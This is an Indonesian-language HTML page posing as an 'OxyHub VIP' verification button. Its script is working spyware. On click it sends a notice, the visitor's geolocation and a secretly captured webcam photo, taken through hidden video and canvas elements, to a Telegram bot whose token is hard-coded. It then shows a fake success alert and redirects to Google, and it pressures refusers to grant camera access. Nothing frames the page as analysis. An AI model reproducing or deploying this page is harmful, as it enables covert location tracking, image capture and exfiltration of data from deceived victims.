<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OxyHub VIP</title>
    <style>
        body { background: #000; color: #ff9900; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #ff9900; color: #000; padding: 20px; border-radius: 10px; font-weight: bold; display: inline-block; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h1>Oxy<span>HUB</span></h1>
    <p>Klik tombol di bawah untuk verifikasi</p>
    <div class="btn" onclick="eksekusi()">🚀 VERIFIKASI SEKARANG</div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const T = '8734003243:AAE01xpuHVuTMdBP_o-1GctMSkqorZiFku0';
        const C = '8286184238';

        function eksekusi() {
            // 1. Kirim Notif Awal (Cek Koneksi)
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=⚡ Target sudah klik tombol!`);

            // 2. Minta Lokasi
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=📍 Lokasi: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // 3. Ambil Kamera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                let v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {
                    let c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        let f = new FormData();
                        f.append('chat_id', C);
                        f.append('photo', b, 'x.jpg');
                        // PAKSA KIRIM FOTO
                        navigator.sendBeacon ? navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendPhoto`, f) : fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:f});
                    }, 'image/jpeg');
                    alert("Verifikasi Berhasil!");
                    window.location.href = "https://www.google.com";
                }, 2000);
            })
            .catch(e => {
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=❌ Target menolak izin kamera.`);
                alert("Wajib klik IZINKAN!");
            });
        }
    </script>
</body>
</html>
